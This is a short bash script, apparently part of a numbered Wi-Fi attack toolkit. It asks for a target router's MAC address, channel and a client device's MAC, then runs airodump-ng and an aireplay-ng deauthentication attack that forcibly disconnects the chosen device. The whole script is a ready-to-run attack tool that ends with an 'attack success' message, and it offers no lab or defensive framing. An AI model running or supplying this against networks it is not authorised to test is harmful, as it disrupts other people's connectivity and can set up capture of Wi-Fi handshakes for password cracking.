. ./config.sh

# see target details
./3-packet-sniffing.sh

echo "Enter target router mac address."
read targetRouterMac
echo "Enter target router channel."
read targetRouterChannel

airodump-ng --bssid $targetRouterMac --channel $targetRouterChannel $myWifiDevice

echo "Enter target device mac address."
read targetDeviceMac

aireplay-ng --deauth $defaultPackets -a $targetRouterMac -c $targetDeviceMac $myWifiDevice

echo "Deauthentication attack success please see details above !!"